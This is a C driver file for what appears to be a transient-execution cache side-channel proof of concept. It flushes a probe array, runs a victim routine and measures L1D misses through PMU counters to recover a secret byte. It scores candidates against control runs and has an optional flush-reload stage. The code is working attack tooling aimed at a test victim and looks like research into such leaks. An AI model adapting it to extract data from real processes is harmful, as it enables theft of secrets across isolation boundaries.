// auto_stage1_2_3_driver.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>
#include "stage3_observer.h"

// Victim PoC 接口
void vf_init(void);  // ✅ 新增声明
void vf_run_attack_once(void);
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s);
void vf_prepare_probe_region(int candidate_count);

// pmu_helper 接口
uint64_t pmu_read_l1d_miss(void);

/* ✅ array2 大小 */
#define ARRAY2_SIZE (256 * 512)

static inline void flush_line(volatile uint8_t *addr) {
    _mm_clflush((void *)addr);
    _mm_mfence();
}

/* ✅ 完整 flush array2 的所有 cache lines */
static void flush_entire_array2(void) {
    volatile uint8_t *base = vf_get_probe_addr_for_secret(0);
    for (size_t i = 0; i < ARRAY2_SIZE; i += 64) {
        _mm_clflush((void*)(base + i));
    }
    _mm_mfence();
}

static int probe_line_via_l1d_miss(volatile uint8_t *addr) {
    _mm_lfence();
    uint64_t m0 = pmu_read_l1d_miss();
    _mm_lfence();
    (void)*addr;
    _mm_lfence();
    uint64_t m1 = pmu_read_l1d_miss();
    _mm_lfence();
    uint64_t delta = m1 - m0;
    return (delta == 0);  // 1 = hit, 0 = miss
}

static int stage3_enabled = 0;
static stage3_config_t g_stage3_cfg;
static uint8_t g_expected_secret = 0;

static void init_expected_secret_from_env(void)
{
    const char *secret_env = getenv("VF_EXPECTED_SECRET");
    if (secret_env && secret_env[0] != '\0') {
        if (strlen(secret_env) == 1) {
            g_expected_secret = (uint8_t)secret_env[0];
        } else {
            g_expected_secret = (uint8_t)atoi(secret_env);
        }
    } else {
        g_expected_secret = (uint8_t)'Y';
    }
    
    fprintf(stderr, "[Driver] Expected secret = 0x%02x ('%c')\n", 
            g_expected_secret, 
            (g_expected_secret >= 32 && g_expected_secret < 127) ? g_expected_secret : '?');
}

static void init_stage3_from_env(void)
{
    const char *enable = getenv("ENABLE_STAGE3");
    if (!enable || strcmp(enable, "1") != 0) {
        stage3_enabled = 0;
        return;
    }

    const char *mode_s = getenv("STAGE3_MODE");
    if (!mode_s) mode_s = "flush-reload";

    stage3_mode_t mode;
    if (stage3_parse_mode(mode_s, &mode) != 0) {
        fprintf(stderr, "Invalid STAGE3_MODE=%s\n", mode_s);
        stage3_enabled = 0;
        return;
    }

    g_stage3_cfg.mode = mode;
    g_stage3_cfg.rounds = 100;
    g_stage3_cfg.attack_repetitions = 1;
    g_stage3_cfg.candidate_count = 256;
    g_stage3_cfg.verbose = 0;
    stage3_enabled = 1;
}

static void print_stage3_round_result(int round_idx, const stage3_result_t *r)
{
    printf("STAGE3_ROUND%d_EXPECTED=%u\n", round_idx, (unsigned)r->expected_secret);
    printf("STAGE3_ROUND%d_TOP1=%u\n", round_idx, (unsigned)r->top1_value);
    printf("STAGE3_ROUND%d_TOP2=%u\n", round_idx, (unsigned)r->top2_value);
    printf("STAGE3_ROUND%d_TOP1_SCORE=%d\n", round_idx, r->top1_score);
    printf("STAGE3_ROUND%d_TOP2_SCORE=%d\n", round_idx, r->top2_score);
    printf("STAGE3_ROUND%d_MATCH=%d\n", round_idx, r->match);
}

static void maybe_run_stage3_after_stage2_round(int round_idx, uint8_t expected_secret)
{
    if (!stage3_enabled) return;

    stage3_result_t r;
    if (stage3_run_single_reuse_secret(&g_stage3_cfg, expected_secret, &r) != 0) {
        fprintf(stderr, "Stage3 failed for round %d\n", round_idx);
        return;
    }
    print_stage3_round_result(round_idx, &r);
}

/**
 * 在 secret = s 的条件下，对 target_s 做多次试验
 * ✅ 修改：每次试验前完整 flush array2
 */
static void stage2_round_dual(uint8_t secret,
                              uint8_t target_s,
                              int trials,
                              int *out_hits_target,  int *out_total_target,
                              int *out_hits_control, int *out_total_control)
{  
    volatile uint8_t *probe_target  = vf_get_probe_addr_for_secret(target_s);

    int hits_t = 0, total_t = 0;
    int hits_c = 0, total_c = 0;

    /* Target 测试 */
    for (int i = 0; i < trials; i++) {
        flush_entire_array2();   // ✅ 完整 flush

        for (volatile int z = 0; z < 100; z++) {}

        vf_run_attack_once();

        for (volatile int z = 0; z < 100; z++) {}

        int hit_t = probe_line_via_l1d_miss(probe_target);
        total_t++;
        hits_t += hit_t;
    }

    /* Control 测试 */
    for (int i = 0; i < trials; i++) {
        flush_entire_array2();   // ✅ 完整 flush
        for (volatile int z = 0; z < 100; z++) {}
        for (volatile int z = 0; z < 100; z++) {}

        int hit_c = probe_line_via_l1d_miss(probe_target);
        total_c++;
        hits_c += hit_c;
    }

    *out_hits_target   = hits_t;
    *out_total_target  = total_t;
    *out_hits_control  = hits_c;
    *out_total_control = total_c;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    init_expected_secret_from_env();
    init_stage3_from_env();
    
    /* ✅ 调用初始化函数 */
    vf_init();

    int trials = 1000;

    /* ✅ 多候选值探测（用于诊断） */
    fprintf(stderr, "\n=== Stage 2 Multi-Candidate Probe ===\n");
    fprintf(stderr, "Expected secret: '%c' (0x%02x)\n", 
            g_expected_secret, g_expected_secret);
    fprintf(stderr, "PoC secret: 'Y' (0x59 = 89)\n\n");
    
    uint8_t candidates[] = {
        g_expected_secret,
        (uint8_t)'Y',     // 89 (PoC secret)
        0, 1, 2, 8, 16, 17, 32, 50, 78, 80, 89, 90, 100, 150, 200
    };
    int n_cand = sizeof(candidates) / sizeof(candidates[0]);
    
    int diag_trials = 200;  // 诊断用较少试验
    
    for (int i = 0; i < n_cand; i++) {
        uint8_t cand = candidates[i];
        int hits_t, tot_t, hits_c, tot_c;
        
        stage2_round_dual(g_expected_secret, cand, diag_trials,
                          &hits_t, &tot_t, &hits_c, &tot_c);
        
        double rate_t = (tot_t > 0) ? (double)hits_t / tot_t : 0.0;
        double rate_c = (tot_c > 0) ? (double)hits_c / tot_c : 0.0;
        double signal = rate_t - rate_c;
        
        char marker = ' ';
        if (cand == g_expected_secret) marker = 'E';
        if (cand == 89) marker = 'P';
        
        fprintf(stderr, "[CAND] [%c] cand=%3u target=%.3f control=%.3f signal=%.3f",
                marker, cand, rate_t, rate_c, signal);
        if (signal > 0.5) fprintf(stderr, " *** HIGH ***");
        fprintf(stderr, "\n");
    }
    
    fprintf(stderr, "\n=== Standard Stage 2 Test ===\n");

    /* 标准 Stage 2 测试（针对 expected_secret） */
    uint8_t s0 = g_expected_secret;
    int hits_t0, tot_t0, hits_c0, tot_c0;
    stage2_round_dual(s0, s0, trials,
                      &hits_t0, &tot_t0,
                      &hits_c0, &tot_c0);

    maybe_run_stage3_after_stage2_round(0, s0);

    printf("STAGE2_ROUND0_SECRET=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_TARGET_VALUE=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_TARGET_HITS=%d\n", hits_t0);
    printf("STAGE2_ROUND0_TARGET_TOTAL=%d\n", tot_t0);
    printf("STAGE2_ROUND0_CONTROL_VALUE=%u\n", (unsigned)s0);
    printf("STAGE2_ROUND0_CONTROL_HITS=%d\n", hits_c0);
    printf("STAGE2_ROUND0_CONTROL_TOTAL=%d\n", tot_c0);

    double r0_t = (tot_t0 > 0) ? (double)hits_t0 / tot_t0 : 0.0;
    double r0_c = (tot_c0 > 0) ? (double)hits_c0 / tot_c0 : 0.0;

    printf("Round0: secret=%u, target=%u, control=%u, "
           "target_rate=%.3f, control_rate=%.3f\n",
           (unsigned)s0, (unsigned)s0, (unsigned)s0, r0_t, r0_c);

    return 0;
}